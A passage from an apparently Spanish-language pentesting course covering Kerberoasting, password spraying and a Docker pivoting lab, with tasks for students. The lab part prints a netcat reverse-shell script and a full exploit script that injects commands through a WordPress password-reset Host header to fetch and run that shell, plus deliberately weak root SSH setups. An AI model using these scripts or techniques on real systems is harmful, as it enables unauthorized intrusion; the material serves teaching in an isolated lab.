validaci\u00f3n es correcta, se env\u00eda el TGS con una clave secreta conocida como clave de sesi\u00f3n. Esta clave se utilizar\u00e1 para cifrar el tr\u00e1fico entre el cliente y el servicio solicitado.</li> <li>Se solicita acceso al servicio concreto presentando el TGS.</li> </ol> </li> <li> <p>Otra fuente de informaci\u00f3n interesante es la siguiente charla (en espa\u00f1ol):</p> </li> </ul> <p></p>"},{"location":"segof/HackingAD1/#como-funciona-kerberoasting","title":"\u00bfC\u00f3mo funciona kerberoasting?","text":"<p>Kerberoasting, explota el protocolo de autenticaci\u00f3n Kerberos y los nombres principales de servicio (SPN). Cualquier usuario del dominio puede solicitar un TGS para acceder a un servicio. A partir de este TGS, se recuperar\u00e1 el hash de la cuenta de servicio que cifra el TGS y se llevar\u00e1 a cabo un ataque de fuerza bruta offline al hash de la contrase\u00f1a del servicio para poder, finalmente, obtener \u00e9sta misma.</p> <p>Para este ataque es imprescindible que la cuenta de servicio tenga establecido un SPN.</p>"},{"location":"segof/HackingAD1/#que-son-los-nombres-de-entidad-principal-de-servicio-spn","title":"\u00bfQu\u00e9 son los nombres de entidad principal de servicio (SPN)?","text":"<p>Un SPN es un identificador \u00fanico para una instancia de servicio, que asocia ese servicio con una cuenta de servicio espec\u00edfica en Active Directory. Las cuentas de servicio en Active Directory son vitales, ya que a menudo ejecutan aplicaciones y servicios cr\u00edticos.</p> <p>Cuando un usuario o un servicio desea acceder a otro servicio, hace referencia al SPN pertinente para solicitar el ticket de servicio necesario, que el servicio de destino valida a continuaci\u00f3n. Los SPN incluyen (pero no se limitan a):</p> <ul> <li>Servicios web: Un servidor web como IIS puede utilizar un SPN como HTTP/servidor web.dominio.com para autenticarse con AD.</li> <li>Servicios SQL: Las instancias de Microsoft SQL Server registran un SPN como MSSQLSvc/servername.domain.com:1433 para habilitar la autenticaci\u00f3n Kerberos.</li> <li>Servicios de archivos: Un servidor de archivos puede tener un SPN como HOST/servidorarchivos.dominio.com.</li> <li>Aplicaciones personalizadas: Las empresas suelen desarrollar aplicaciones internas que utilizan AD para la autenticaci\u00f3n. Estas aplicaciones tambi\u00e9n pueden registrar sus SPN.</li> </ul>"},{"location":"segof/HackingAD1/#hands-on","title":"Hands-on","text":"<p>Tarea</p> <p>Buscad informaci\u00f3n en los cientos de recursos disponibles en la red sobre c\u00f3mo llevar a cabo este ataque de forma exitosa y documentadlo en un informe a entregar.</p> <ul> <li>Obtenemos el TGS del servicio</li> </ul> <p></p> <ul> <li>Lo almacenamos en un fichero de texto para proceder al descifrado offline. Con la ayuda de hashcat, averiguamos que c\u00f3digo debemos utilizar para el descifrado de este tipo de hashes:</li> </ul> <p></p> <ul> <li>Utilizando hashcat adecuadamente, obtenemos el password de la cuenta de servicio:</li> </ul> <p></p>"},{"location":"segof/HackingAD1/#password-spraying","title":"Password spraying","text":"<p>Una forma de comprobar el alcance que tiene esta contrase\u00f1a en los equipos del dominio es realizar un password spraying sobre ellos. Hist\u00f3ricamente se ha utilizado la aplicaci\u00f3n crackmapexec (cme) para este cometido y, de hecho, en la mayor\u00eda de la literatura sobre este tema es el m\u00e1s nombrado.</p> <p>Sin embargo, el desarrollo de cme se ha paralizado recientemente. En su lugar, tenemos a un sucesor natural como es NetExec (nxc), con pr\u00e1cticamente su misma forma de uso y sintaxis.</p> <p>Haciendo uso de esta herramienta y de la t\u00e9cnica mencionada, vemos como hemos comprometido pr\u00e1cticamente todo el dominio (cuando la autenticaci\u00f3n es exitosa, lo indica con <code>Pwn3d!</code>):</p> <p></p> <p>Tarea</p> <p>Investiga c\u00f3mo llevar a cabo este password spraying con nxc y docum\u00e9ntalo.</p> <p>Tambi\u00e9n podemos hacer uso de alg\u00fan programa para acceso remoto, como por ejemplo evil-winrm, para aprovecharnos de la interfaz de administraci\u00f3n remota y acceder al DC:</p> <p></p> <p></p> <p>Tarea</p> <p>Averigua c\u00f3mo hacer uso de evil-winrm u otro programa para obtener una shell en el DC comprometido.</p>"},{"location":"segof/HackingAD1/#referencias","title":"Referencias","text":"<p>Portswigger - XML external entity (XXE) injection</p> <p>mitm6 \u2013 compromising IPv4 networks via IPv6</p> <p>MITM6 Strikes Again: The Dark Side of IPv6  </p> <p>Kerberos Fundamentals</p> <p>C\u00f3mo proteger Active Directory contra Kerberoasting: Seguridad AD 101</p> <p>How to install Certificate Authority (CA) server and create certificates</p>"},{"location":"segof/Intro/","title":"Teor\u00eda pentesting","text":""},{"location":"segof/Intro/#conceptos-basicos","title":"Conceptos b\u00e1sicos","text":"<p>Un pentesting o test de intrusi\u00f3n puede ser definido como una forma legal y autorizada de localizar y \"explotar\" satisfactoriamente sistemas inform\u00e1ticos con el prop\u00f3sito de hacerlos m\u00e1s seguros.</p> <p>El proceso incluye un sondeo en busca de vulnerabilidades as\u00ed como proporcionar una serie de pruebas de concepto de los ataques para as\u00ed demostrar que las vulnerabilidades son reales.</p> <p>Un adecuado pentest siempre acaba con una serie de recomendaciones espec\u00edficas para solucionar los problemas que se han descubierto en la prueba. La idea general es encontrar problemas de seguridad usando las mismas herramientas y t\u00e9cnicas que un atacante. Estos descubrimientos podr\u00e1n ser mitigados antes de que un cibercriminal real abuse de ellos.</p> <p>Los test de intrusi\u00f3n suelen conocerse de varias maneras:</p> <ul> <li>Pentesting</li> <li>PT</li> <li>Ethical hacking</li> <li>White hacking</li> <li>Offensive security</li> <li>Red teaming</li> </ul> <p>NO es lo mismo un pentest que un an\u00e1lisis de vulnerabilidades.</p>"},{"location":"segof/Intro/#fases-de-un-pentest","title":"Fases de un pentest","text":"<p>Un Penetration Test comprende m\u00faltiples etapas con diferentes tipos de actividades en distintos \u00e1mbitos y entornos. La profundidad con que se lleven a cabo las actividades depender\u00e1 de ciertos factores, entre los que se destaca el riesgo que puede generar hacia el cliente alguno de los m\u00e9todos que se apliquen durante la evaluaci\u00f3n.</p> <p>Se establece un previo acuerdo con el cliente para llevar a cabo las diferentes fases del an\u00e1lisis. Dependiendo de la fuente consultada, el nombre o algunos detalles de las fases pueden diferir, pero en rasgos generales pueden nombrarse:</p> <ol> <li> <p>Fase de reconocimiento: Posiblemente, esta sea una de las etapas que m\u00e1s tiempo demande. Asimismo, se definen objetivos y se recopila toda la informaci\u00f3n posible que luego ser\u00e1 utilizada a lo largo de las siguientes fases. La informaci\u00f3n que se busca abarca desde nombres y direcciones de correo de los empleados de la organizaci\u00f3n, hasta la topolog\u00eda de la red, direcciones IP, entre otros. Cabe destacar que el tipo de informaci\u00f3n o la profundidad de la pesquisa depender\u00e1n de los objetivos que se hayan fijado en la auditor\u00eda.</p> </li> <li> <p>Fase de escaneo: Utilizando la informaci\u00f3n obtenida previamente se buscan posibles vectores de ataque. Esta etapa involucra el escaneo de puertos y servicios. Posteriormente se realiza el escaneo de vulnerabilidades que permitir\u00e1 definir los vectores de ataque.</p> </li> <li> <p>Fase de enumeraci\u00f3n: El objetivo de esta etapa es la obtenci\u00f3n de los datos referente a los usuarios, nombres de equipos, servicios de red, entre otros. A esta altura de la auditor\u00eda, se realizan conexiones activas con el sistema y se ejecutan consultas dentro del mismo.</p> </li> <li> <p>Fase de acceso: En esta etapa finalmente se realiza el acceso al sistema. Esta tarea se logra a partir de la explotaci\u00f3n de aquellas vulnerabilidades detectadas que fueron aprovechadas por el auditor para comprometer el sistema.</p> </li> <li> <p>Fase de mantenimiento de acceso: Luego de haberse obtenido el acceso al sistema, se busca la manera de preservar el sistema comprometido a disposici\u00f3n de quien lo ha atacado. El objetivo es mantener el acceso al mencionado sistema perdurable en el tiempo.</p> </li> </ol> <p>Fuente</p> <p></p> <p></p> <p>Se usan muchas y muy diferentes herramientas, incluso dependiendo del pentester o analista de seguridad, para cada fase. En las siguientes secciones nos centraremos en el archiconocido esc\u00e1ner de puertos Nmap que, como su nombre hace pensar, se utilizar\u00eda en la fase de escaneo, tras haber recopilado la mayor cantidad de informaci\u00f3nd el objetivo.</p>"},{"location":"segof/Intro/#pentesting-vs-red-teaming","title":"Pentesting vs Red teaming","text":"<p>Pentesting y red teaming son dos enfoques utilizados en la seguridad inform\u00e1tica para evaluar la resistencia de los sistemas y redes contra ciberataques. Aunque ambos tienen el objetivo com\u00fan de identificar vulnerabilidades, existen diferencias clave en su alcance, metodolog\u00eda y objetivos. Aqu\u00ed te dejo un resumen de cada uno:</p>"},{"location":"segof/Intro/#pentesting-pruebas-de-intrusion","title":"Pentesting (Pruebas de intrusi\u00f3n)","text":"<ul> <li>Objetivo: Identificar y explotar vulnerabilidades espec\u00edficas en un sistema o aplicaci\u00f3n.</li> <li>Enfoque: Simula ataques para descubrir posibles puntos de entrada o fallos de seguridad, como vulnerabilidades en aplicaciones web, redes, o sistemas operativos.</li> <li>Alcance: Suele ser m\u00e1s limitado y espec\u00edfico, centrado en una o varias \u00e1reas o componentes de la infraestructura.</li> <li>Duraci\u00f3n: Generalmente corto (desde unos d\u00edas a algunas semanas).</li> <li>Metodolog\u00eda: Evaluaci\u00f3n t\u00e9cnica basada en un conjunto de pruebas previamente acordadas (black-box, white-box, grey-box).</li> <li>Reportes: Detalla las vulnerabilidades encontradas y c\u00f3mo explotarlas, pero no suele incluir el comportamiento del equipo de seguridad ni la respuesta ante ataques.</li> <li>Resultados esperados: Un listado t\u00e9cnico de vulnerabilidades y recomendaciones de mitigaci\u00f3n.</li> </ul>"},{"location":"segof/Intro/#red-teaming","title":"Red Teaming","text":"<ul> <li>Objetivo: Evaluar la capacidad de la organizaci\u00f3n para detectar, responder y prevenir ataques reales en un entorno lo m\u00e1s cercano posible a la realidad.</li> <li>Enfoque: Simula ciberataques de un adversario real, utilizando m\u00faltiples vectores de ataque (f\u00edsico, social, cibern\u00e9tico) para comprometer la seguridad de la organizaci\u00f3n.</li> <li>Alcance: Amplio, abarca todo el entorno de la organizaci\u00f3n, incluyendo personas, procesos y tecnolog\u00eda.</li> <li>Duraci\u00f3n: Suele ser m\u00e1s largo (varias semanas o meses) y menos acotado.</li> <li>Metodolog\u00eda: Implica la planificaci\u00f3n y ejecuci\u00f3n de ataques sofisticados que pueden incluir phishing, ingenier\u00eda social, explotaci\u00f3n de redes y dispositivos f\u00edsicos, entre otros.</li> <li>Reportes: Adem\u00e1s de las vulnerabilidades t\u00e9cnicas, incluye la evaluaci\u00f3n de la respuesta del equipo de seguridad, puntos d\u00e9biles en la detecci\u00f3n y recomendaciones estrat\u00e9gicas.</li> <li>Resultados esperados: Evaluaci\u00f3n integral de la resiliencia de la organizaci\u00f3n frente a amenazas reales, m\u00e1s que solo la identificaci\u00f3n de fallos t\u00e9cnicos.</li> </ul>"},{"location":"segof/Intro/#diferencias-clave","title":"Diferencias clave","text":"Aspecto Pentesting Red Teaming Alcance Espec\u00edfico, limitado Amplio, abarca toda la organizaci\u00f3n Duraci\u00f3n Corta Prolongada Enfoque Vulnerabilidades t\u00e9cnicas Evaluaci\u00f3n de la respuesta y resiliencia M\u00e9todos de ataque T\u00e9cnicas directas y espec\u00edficas Ataques simulados de adversarios reales Resultados Reporte t\u00e9cnico de vulnerabilidades Evaluaci\u00f3n estrat\u00e9gica y t\u00e1ctica <p>Ambos enfoques son complementarios, y las organizaciones suelen utilizar ambos para cubrir distintas \u00e1reas de seguridad. Mientras el pentesting se centra en identificar fallos concretos en sistemas, el red teaming ofrece una visi\u00f3n m\u00e1s amplia de c\u00f3mo un atacante podr\u00eda explotar esos fallos y c\u00f3mo responder\u00eda el equipo de seguridad.</p>"},{"location":"segof/Pivoting/","title":"Pivoting","text":"<p>El pivoting hace referencia a una t\u00e9cnica donde tras comprometer un equipo, nos damos cuenta de que \u00e9ste nos da acceso a otros equipos o redes a los que de una forma directa no podr\u00edamos acceder. As\u00ed pues, nuestra m\u00e1quina comprometida o m\u00e1quina de salto nos sirve para seguir obteniendo nuevos accesos.</p> <p>De forma esquem\u00e1tica</p> <ul> <li>\"X\" tiene acceso a \"Y\"</li> <li>\"Y\" tiene acceso a \"Z\"</li> <li>\"X\" no tiene acceso a \"Z\"</li> <li>\"X\" consigue acceso a \"Z\" utilizando \"Y\" c\u00f3mo m\u00e1quina de pivoting</li> </ul>"},{"location":"segof/Pivoting/#descripcion-de-la-practica","title":"Descripci\u00f3n de la pr\u00e1ctica","text":"<p>Para la realizaci\u00f3n de esta pr\u00e1ctica se montar\u00e1 una infraestructura completa en Docker tal y como muestra la siguiente imagen:</p> <p></p> <p>Tenemos dos contenedores llamados v\u00edctima 1 y v\u00edctima 2 ambos en la red 172.16.101.0/24. El atacante por otra parte en una subred diferente, la 172.16.100.0/24.</p> <p>La m\u00e1quina helper o gateway tiene dos interfaces, una en cada una de las dos subredes de este escenario.</p>"},{"location":"segof/Pivoting/#explicacion-de-los-archivos-de-docker-compose","title":"Explicaci\u00f3n de los archivos de docker compose","text":"<p>En primer lugar, tenemos un archivo <code>docker-compose-subnet.yml</code> cuyo fin \u00fanico es la creaci\u00f3n de las subredes que vamos a necesitar y que hemos nombrado anteriormente.</p> <pre><code>version: \"3.8\"\n\nnetworks:\nattacker:\ndriver: bridge\nipam:\ndriver: default\nconfig:\n- subnet: 172.16.100.0/24\ngateway: 172.16.100.2\nvictim:\ndriver: bridge\nipam:\ndriver: default\nconfig:\n- subnet: 172.16.101.0/24\ngateway: 172.16.101.3\n</code></pre> <p>La secci\u00f3n <code>ipam</code> es un acr\u00f3nimo de IP Address Management y es d\u00f3nde indicamos las direcciones de red as\u00ed como las puertas de enlace. Para este escenario el driver por defecto (bridge) es suficiente. </p> <p>Info</p> <p>Si ten\u00e9is inter\u00e9s en saber los drivers de red que pueden existir y cu\u00e1ndo se usan, pod\u00e9is leer aqu\u00ed o un peque\u00f1o resumen aqu\u00ed</p> <p>Luego tenemos un <code>docker-compose.yml</code> para construir los contenedores que vamos a utilizar:</p> <p><pre><code>version: \"3.8\"\n\nservices:\nattacker:\nbuild:\ncontext: ./dockerfiles\ndockerfile: attacker.Dockerfile\ncontainer_name: attacker\nhostname: attacker\nextra_hosts:\n- \"helper:172.16.100.11\"\nlinks:\n- helper\nnetworks:\nattacker:\nipv4_address: 172.16.100.10\n\nhelper:\nbuild:\ncontext: ./dockerfiles\ndockerfile: helper.Dockerfile\ncontainer_name: helper\nhostname: helper\nextra_hosts:\n- \"victim1:172.16.101.20\"\n- \"victim2:172.16.101.21\"\nnetworks:\nattacker:\nipv4_address: 172.16.100.11\nvictim:\nipv4_address: 172.16.101.11\nvictim1:\nbuild:\ncontext: ./dockerfiles\ndockerfile: victim1.Dockerfile\nhostname: victim1\ncontainer_name: victim1\nextra_hosts:\n- \"helper:172.16.101.11\"\n- \"victim2:172.16.101.21\"\nnetworks:\nvictim:\nipv4_address: 172.16.101.20\n\nvictim2:\nimage: vulhub/wordpress:4.6\ncontainer_name: victim2\nhostname: victim2\ndepends_on:\n- mysql\nenvironment:\n- WORDPRESS_DB_HOST=172.16.101.22:3306\n- WORDPRESS_DB_USER=root\n- WORDPRESS_DB_PASSWORD=root\n- WORDPRESS_DB_NAME=wordpress\nports:\n- \"8080:80\"\nextra_hosts:\n- \"helper:172.16.101.11\"\n- \"victim1:172.16.101.20\"\nnetworks:\nvictim:\nipv4_address: 172.16.101.21\nvolumes:\n- wp_vol:/var/www/html\n\nmysql:\nimage: mysql:5\ncontainer_name: victim2_mysql\nhostname: victim2sql\nenvironment:\n- MYSQL_ROOT_PASSWORD=root\nnetworks:\nvictim:\nipv4_address: 172.16.101.22\n\nwp-cli:\nimage: forumone/wordpress-cli:7.1-cli2.3.0\ndepends_on:\n- mysql\n- victim2\nvolumes:\n- wp_vol:/var/www/html\nnetworks:\nvictim:\ncommand: &gt;\n/bin/sh -c '\nsleep 10;\nwp core install --path=\"/var/www/html\" --url=\"http://172.16.101.21\" --title=\"Pivot Your Way\" --admin_user=admin --admin_password=adminpass --admin_email=admin@admin.com --allow-root\n'\n\nvolumes:\nwp_vol:\n</code></pre> D\u00e1os cuenta de como las im\u00e1genes se construyen localmente, cada una haciendo uso de su Dockerfile, con el fin de poder personalizarla a nuestra conveniencia.</p> <p>Para el caso del <code>helper</code> utilizamos como base una imagen de phusion que a su vez est\u00e1 basada en Ubuntu pero convenientemente modificada para que trabaje mejor con Docker. M\u00e1s detalles aqu\u00ed </p> <p>Para este contenedor se ha habilitado el login de root mediante SSH, algo poco recomendable en t\u00e9rminos de seguridad pero que para nuestro escenario ficticio y como prueba de concepto, nos es de utilidad.</p> <p>La sentencia <code>extra_hosts</code>a\u00f1ade una entrada en el archivo <code>/etc/hosts</code> del contenedor para que de esta forma podamos utilizar su nombre, en lugar de la IP, para comunicarnos:</p> <pre><code>ROM phusion/baseimage:jammy-1.0.1\n\nRUN apt update -y \\\n&amp;&amp; apt install -y \\\nssh \\\niputils-ping \\\nnet-tools \\\n&amp;&amp; echo 'root:123456789' | chpasswd \\\n&amp;&amp; sed -i \"s/#PasswordAuthentication no/PasswordAuthentication yes/g\" /etc/ssh/sshd_config \\\n&amp;&amp; sed -i \"s/#PermitRootLogin yes/PermitRootLogin yes/g\" /etc/ssh/sshd_config \\\n&amp;&amp; echo 'GatewayPorts yes' &gt;&gt; /etc/ssh/sshd_config\n\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n</code></pre> <p>Para la imagen del contenedor <code>attacker</code> se utiliza la misma imagen de <code>phusion</code> como base o punto de partida. Adem\u00e1s, tambi\u00e9n se instalan en \u00e9l algunas utilidades que necesitaremos (ping, nmap, hydra...) como vemos en su Dockerfile:</p> <pre><code>FROM phusion/baseimage:jammy-1.0.1\n\nLABEL maintainer=\"sauman\"\n\nLABEL name=\"attacker\"\n\nRUN apt update -y \\\n&amp;&amp; apt install -y \\\nnmap \\\niputils-ping \\\nnet-tools \\\niproute2 \\\nproxychains4 \\\nhydra \\\nncat \\\n&amp;&amp; curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-05.txt -o /home/rock.txt\n</code></pre> <p>A continuaci\u00f3n, el Dockerfile para <code>victim1</code>tampoco tiene mucho misterio. Con el comando <code>wget</code> descarga la herramienta sar2html. Se trata de na aplicaci\u00f3n usada para graficar estad\u00edsticas de uso del sistema. Esta herramienta posee una vulnerabilidad que aprovecharemos m\u00e1s adelante para nuestro escenario:</p> <pre><code>FROM phusion/baseimage:jammy-1.0.1\n\nRUN apt update -y \\\n&amp;&amp; apt install -y python3-pip\n\nWORKDIR /opt\n\nRUN apt install wget -y \\\n&amp;&amp; wget \"https://master.dl.sourceforge.net/project/sar2html/sar2html-4.0.0.tar.gz?viasf=1\" \\\n&amp;&amp; tar -xvf *\n\nWORKDIR /opt/sar2html-4.0.0/\n\nRUN pip3 install -r requirements.txt\n\nCMD bash -c \"./startWeb\"\n</code></pre> <p>Por \u00faltimo, para <code>victim2</code> no hace falta modificar ninguna imagen ya que en el registro de Docker ya existe una imagen de WordPress vulnerable. Simplemente construiremos el contenedor a partir de ella, configurando los par\u00e1metros adecuados, incluyendo adem\u00e1s una base de datos MySQL.</p> <p>Como a\u00f1adido, utilizaremos wp-cli para la cnfiguraci\u00f3n autom\u00e1tica de Wordpress:</p>"},{"location":"segof/Pivoting/#construyendo-y-corriendo-los-contenedores","title":"Construyendo y corriendo los contenedores:","text":"<p>En primer lugar construimos nuestro escenario:</p> <p><pre><code>docker-compose -f docker-compose-subnet.yml -f docker-compose.yml build\n</code></pre> Para posteriormente arrancarlo</p> <pre><code>docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up\n</code></pre> <p>Si listamos los contenedores arrancados, deber\u00edamos tener 5.</p> <p>Tarea</p> <p>Comprueba que puedes hacer los siguientes pings utilizando los nombres adecuados para ello:</p> <ul> <li>De victim2 a victim1</li> <li>De victim1 a victim2</li> <li>De helper a victim1 y a victim2</li> <li>Comprueba que el ping de attacker a victim1 y a victim2 no es exitoso, no por nombre ni por IP</li> </ul>"},{"location":"segof/Pivoting/#ataque-y-pivoting","title":"Ataque y pivoting","text":"<p>En esta fase lo primero que vamos a hacer es escanear los puertos del host helper.</p> <p>Tarea</p> <p>Accede por SSH a la m\u00e1quina (contenedor) attacker y realiza un escaneo de puertos con nmap  contra l m\u00e1quina helper.</p> <p>Tarea</p> <p>En base a los descubrimientos del anterior punto, intenta obtener acceso a la m\u00e1quina helper.</p> <p>Puede ayudarte de hydra y del diccionario rockyou ubicado el el home.</p> <p>Una vez obtenido el acceso al contenedor helper y haciendo uso del comando <code>ip a</code>, descubriremos que estamos conectados a dos redes diferentes, ya que tenemos dos interfaces, cada una conectada una de esas redes (<code>172.16.100.11</code> y <code>172.16.101.11</code>)</p> <p>Tambi\u00e9n es posible utilizar el comando <code>hostname -I</code> para ver todas las IP del host.</p> <p>Con todos estos datos encima de la mesa, habiendo descubierto la infraestructura, podemos llevar a cabo una redirecci\u00f3n de puertos utilizando un proxy SOCKS. Con esto conseguimos que todo el tr\u00e1fico hacia un determinado puerto en el servidor destino, viaje a trav\u00e9s de una conexi\u00f3n ssh. </p> <p>Para ello deb\u00e9is utilizar el comando, que deber\u00e9is completar, con la forma:</p> <p><pre><code>ssh __ 8500 _____@________ __ __\n</code></pre> Donde, lo que deb\u00e9is rellenar en los huecos, por estricto orden de aparici\u00f3n de izquierda a derecha:</p> <ul> <li>Switch/opci\u00f3n que pondr\u00e1 un puerto local a la escucha, de tal manera que todo lo dirigido a ese puerto se redirigir\u00e1 por la conexi\u00f3n SSH a modo de proxy SOCKS, independientemente del destino</li> <li>Usuario para SSH</li> <li>IP para SSH</li> <li>Switch/opci\u00f3n para que la ejecuci\u00f3n sea en background</li> <li>Switch/opci\u00f3n para deshabilitar la ejecuci\u00f3n de comandos</li> </ul> <p>Tarea</p> <p>Comprueba con el comando netstat que este comando se est\u00e1 ejecutando en background.</p> <p>Lo que necesitamos ahora es un proxy para poder enviar todo nuestro tr\u00e1fico a trav\u00e9s del puerto <code>8500</code> y que, por tanto, se produzca la redirecci\u00f3n configurada anteriormente. </p> <p>La herramienta que utilizaremos para este cometido es <code>proxychains</code> y por tanto hemos de configurarla en el archivo <code>/etc/proxychains.conf</code>, concretamente la l\u00ednea del archivo que configura el socks4, debemos decirle que utilice el puerto <code>8500</code>.</p> <p>Consejo</p> <p>Recordad que para cambiar valores en un fichero, pod\u00e9is utilizar el comando: <pre><code>sed -i 's/T\u00e9rmino a sustituir/T\u00e9rmino nuevo/g' archivo   </code></pre></p>"},{"location":"segof/Pivoting/#localizando-nuevas-victimas","title":"Localizando nuevas v\u00edctimas","text":"<p>Nuestra prioridad ahora es encontrar nuevos hosts. Si tuvi\u00e9ramos nmap todo resultar\u00eda mucho m\u00e1s f\u00e1cil pero siendo honestos, no es un escenario realista.</p> <p>Tarea</p> <p>Comprueba que en la m\u00e1quina helper no tenemos disponible nmap.</p> <p>De cualquier forma, sabemos que la m\u00e1quina helper es parte de dos redes distintas. Ambas m\u00e1quinas, helper y attacker, pertenecen a la misma red <code>172.16.100.0/24</code>. Por ello, lo m\u00e1s l\u00f3gico es escanear la red <code>172.16.101.0/24</code> en busca de todos los hosts presentes en ella.</p> <p>Tarea</p> <p>Para detectar los hosts presentes en <code>172.16.101.0/24</code>, vamos a utilizar una t\u00e9cnica llamada ping sweep.</p> <p>Utiliza un one-liner en <code>bash</code> que permita llevar a cabo esta t\u00e9cnica, documenta y examina los resultados.</p>"},{"location":"segof/Pivoting/#victim1","title":"Victim1","text":"<p>Intenta realizar un ping desde la m\u00e1quina <code>attacker</code> a <code>victim1</code>. </p> <p>Recuerda que para pasar el tr\u00e1fico de nuestros comandos por el proxy y luego redirigirlo por nuestra conexi\u00f3n SSH, debemos precederlos de la palabra \"proxychains\", tal que as\u00ed:</p> <pre><code>proxychains ping x.x.x.x\n</code></pre> <p>Pregunta</p> <p>\u00bfPor qu\u00e9 no podemos hacer ping utilizando proxychains?</p> <p>A pesar de no poder hacer ping, s\u00ed que podemos usar Nmap para escanear puertos, al menos las opciones que utilizan TCP o UDP.</p> <p>Tarea</p> <p>Realiza desde la m\u00e1quina <code>attacker</code>, haciendo uso de proxychains, un escaneo de puertos a la m\u00e1quina <code>victim1</code> </p> <ul> <li>El escaneo con <code>nmap</code> debe ser del tipo connect scan</li> <li>Se debe utilizar la opci\u00f3n de deshabilitar el descubrimiento de hosts (host discovery)</li> <li>Utilizad la opci\u00f3n de escaneo r\u00e1pido para escanear \u00fanicamente los 100 puertos m\u00e1s comunes</li> </ul> <p>Si has descubierto alg\u00fan puerto abierto, utiliza el comando <code>curl</code> a trav\u00e9s de <code>proxychains</code>para comprobar si el host responde algo interesante en ese puerto.</p> <p>Tarea</p> <p>Si obtuvieras una respuesta positiva, intenta acceder a trav\u00e9s del navegador para descubrir de qu\u00e9 se trata y documentalo.</p> <p>Esta aplicaci\u00f3n web posee una vulnerabilidad del tipo zip slip o tar slip.</p> <p>Para explotar esta vulnerabilidad, pod\u00e9is seguir los siguientes pasos:</p> <ol> <li>Descargar la herramienta generadora de POC (prueba de concepto) </li> <li> <p>Crear el archivo que utilizaremos:</p> <pre><code>echo Vulnerabilidad explotada &gt; test.css\n</code></pre> </li> <li> <p>Generar el archivo .tar malicioso. Mirando la ayuda del script del repositorio que nos hemos clonado antes, generaremos el archivo malicioso atendiendo a:</p> <ul> <li>Para el sistema operativo lnux</li> <li>El nombre del tar ser\u00e1 \"pivoting.tar\" y contendr\u00e1 el archivo \"test.css\"</li> <li>El path o ruta ser\u00e1 static/css</li> <li>Una profundidad o n\u00famero de directorios de los que se har\u00e1 traversal, ser\u00e1 de 3</li> </ul> </li> <li> <p>En el apartado New host subir el archivo .tar generado</p> </li> <li>Acceder a la ruta del archivo</li> </ol> <p>Tarea</p> <p>Comprueba y documenta que accediendo a la ruta del archivo podemos comprobar que esta m\u00e1quina ha sido comprometida, tanto desde el navegador como desde el terminal (de la m\u00e1quina attacker) con el comando curl, haciendo uso dde proxychains</p>"},{"location":"segof/Pivoting/#victim2","title":"Victim2","text":"<p>Para comenzar con esta nueva m\u00e1quina, debemos realizar de nuevo un escaneo con nmap id\u00e9ntico al anterior, a trav\u00e9s de proxychains desde la m\u00e1quina attacker a la m\u00e1quina victim2 y al MySQL.</p> <p>Tarea</p> <p>Documenta los escaneos anteriores. \u00bfQu\u00e9 CMS has descubierto que se est\u00e1 ejecutando?</p> <p>Para vulnerar la m\u00e1quina victim2, vamos a hacer uso de dos elementos:</p> <ol> <li> <p>Este c\u00f3digo para una reverse shell</p> rev.sh<pre><code>#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 172.16.101.11 8500 &gt;/tmp/f    </code></pre> </li> <li> <p>Este c\u00f3digo como POC (proof of concept o prueba de concepto)</p> <p>poc.sh<pre><code>#!/bin/bash\n\nfunction prep_host_header() {\ncmd=\"$1\"\nrce_cmd=\"\\${run{$cmd}}\";\nrce_cmd=\"`echo $rce_cmd | sed 's^/^\\${substr{0}{1}{\\$spool_directory}}^g'`\"\nrce_cmd=\"`echo $rce_cmd | sed 's^ ^\\${substr{10}{1}{\\$tod_log}}^g'`\"\nhost_header=\"target(any -froot@localhost -be $rce_cmd null)\"\nreturn 0\n}\n\nif [ \"$#\" -ne 1 ]; then\necho -e \"Uso:\\n$0 url-objetivo\\n\"\nexit 1\nfi\ntarget=\"$1\"\nhttp_server=\"172.16.101.11/rev.sh\"\n\n# Guardamos el payload de la reverse shell en el objetivo, en el directorio /tmp/rev.sh\ncmd=\"/usr/bin/curl $http_server -o /tmp/rev.sh\"\nprep_host_header \"$cmd\"\ncurl -H \"Host: $host_header\" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' \"$target/wp-login.php?action=lostpassword\"\necho -e \"\\n\\e[92m[+]\\e[0m Payload enviado\"\n\n# Obtenemos la reverse shell\ncmd=\"/bin/chmod +x /tmp/rev.sh\"\nprep_host_header \"$cmd\"\ncurl -H \"Host: $host_header\" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' \"$target/wp-login.php?action=lostpassword\"\necho -e \"\\n\\e[92m[+]\\e[0m Payload enviado\"\n\ncmd=\"/bin/sh /tmp/rev.sh\"\nprep_host_header \"$cmd\"\ncurl -H \"Host: $host_header\" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' \"$target/wp-login.php?action=lostpassword\"\necho -e \"\\n\\e[92m[+]\\e[0m Payload enviado\"\n</code></pre> Antes de llevar a cabo la explotaci\u00f3n, vamos a comprobar que existe conectividad entre vitim2 y attacker. Utilizando netcat (nc en victim2 y ncat attacker), intenta establecer una conexi\u00f3n de una a otra.</p> </li> </ol> <p>Cuesti\u00f3n</p> <p>\u00bfConsigues establecer esta conexi\u00f3n?\u00bfPor qu\u00e9?</p> <p>Si repasamos el c\u00f3digo de <code>poc.sh</code> vemos que el te\u00f3rico curso de los acontecimientos ha de ser:</p> <ol> <li>Ejecutar un servidor web en el terminal de attacker para que el comando que se inyecte en la v\u00edctima haga que se descargue nuestra reverse shell <code>rev.sh</code> en su directorio <code>/tmp</code>:    <pre><code>$ python3 -m http.server 80\n</code></pre></li> <li>Poner a la escucha <code>ncat</code> en attacker en un puerto de vuestra elecci\u00f3n</li> <li>Ejecutar desde attacker, obviamente haciendo uso de proxychains, <code>poc.sh</code> contra la m\u00e1quina victim2</li> </ol> <p>Tarea</p> <p>Ejecuta los pasos anteriores y comprueba si recibes correctamente la reverse shell.</p>"},{"location":"segof/Pivoting/#reverse-shell","title":"Reverse shell","text":"<p>Aqu\u00ed necesitamos utilizar el concepto de de remote port forwarding. Con esta t\u00e9cnica crearemos un nuevo t\u00fanel que nos permitir\u00e1 redirigir todo el tr\u00e1fico que vaya destinado al puerto 80 de la m\u00e1quina victim2 hacia el puerto 80 de nuestra m\u00e1quina attacker. Con esto conseguiremos que cuando ejecutemos <code>poc.sh</code>, se consiga la 